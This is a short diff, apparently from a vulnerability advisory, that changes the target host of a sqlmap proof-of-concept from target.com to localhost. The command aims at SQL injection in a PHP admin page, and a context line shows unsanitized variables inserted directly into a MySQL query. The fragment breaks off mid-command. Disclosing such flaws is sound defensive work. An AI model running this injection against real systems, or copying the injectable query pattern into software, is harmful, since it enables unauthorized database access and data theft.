@@ -63,7 +63,7 @@ mysql_query("INSERT into cat_prod (prod, cat) VALUES('$id', '$cat')") or die(mys
 ### POC
 
 ```bash
-sqlmap -u "http://target.com/handgunner-administrator/prod.php?cat=1" \
+sqlmap -u "http://localhost:8081/handgunner-administrator/prod.php?cat=1" \
   --data="price=100&name=test&model=test&serial=123&description=test" \
   --batch \
   -D cj_handgunner \
